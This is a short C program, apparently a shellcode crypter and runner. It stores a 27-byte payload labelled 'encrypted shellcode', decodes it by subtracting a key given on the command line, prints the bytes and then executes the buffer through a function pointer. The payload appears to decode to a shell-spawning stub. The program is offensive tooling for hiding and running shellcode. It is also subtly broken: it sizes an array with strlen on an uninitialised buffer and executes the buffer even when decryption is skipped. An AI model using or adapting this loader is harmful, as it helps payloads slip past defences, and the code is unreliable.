#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
main(int argc, char **argv)
{
        int i;
      	unsigned char string[27];
        
	unsigned char encrypt[] = "\x33\xc2\x52\x33\xdd\x6a\x70\x31\x75\x6a\x6a\x31\x31\x64\x6b\x8b\xe5\x52\x8b\xe3\x55\x8b\xe4\xb2\x0d\xcf\x82"; //encrypted shellcode
        	
        unsigned char decrypted_string[strlen(string)];
       
        char *key_ch;
        char key_int;
      
        key_ch = argv[1];
        key_int = atoi(key_ch);
        
        printf("\nLength of String is:%d\n",sizeof(string));
        

        if (strcmp(argv[2], "decrypt") == 0)
        {
                i = 0;
                while(i <= sizeof(string)-1)

                {
                        decrypted_string[i] = encrypt[i] - key_int;
                        i++;
                }      
               
                printf("Decrypted String: ");
                i = 0;
                while(i <= sizeof(string)-1)
                {
                       
                        printf("\\x%02x", decrypted_string[i]);
                        i++;
                }
 
                printf("\n");
        }

int (*ret)(void) = (int(*)(void))decrypted_string;
ret();

}
